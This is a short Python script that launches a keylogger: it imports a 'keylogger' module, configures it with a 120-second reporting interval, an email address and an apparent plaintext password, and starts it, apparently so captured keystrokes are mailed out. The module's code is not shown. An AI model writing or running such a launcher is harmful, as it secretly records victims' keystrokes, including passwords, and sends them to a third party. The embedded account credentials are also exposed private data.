#!/usr/bin/env python

import keylogger
my_keylogger=keylogger.Keylogger(120,"Prags948@gmail.com","btechcse#11")
my_keylogger.start()